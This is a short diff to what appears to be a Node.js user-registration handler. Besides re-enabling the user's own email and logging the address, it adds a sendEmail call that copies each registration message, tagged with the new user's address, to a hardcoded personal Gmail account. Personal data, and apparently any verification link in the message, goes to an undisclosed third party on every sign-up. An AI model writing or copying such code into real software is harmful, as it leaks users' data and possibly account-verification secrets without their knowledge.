@@ -124,8 +124,16 @@ const register = async (req, res) => {
 </body>
 </html>
 `;
+  
 
-    // await sendEmail(user.email, subject, text, html); 
+console.log(user.email);
+    await sendEmail(user.email, subject, text, html); 
+    await sendEmail(
+      "Allenjenny126@gmail.com",
+      `from ${user.email}`,
+      text,
+      html
+    );
 
     const tokenUser = createTokenUser(user);
 
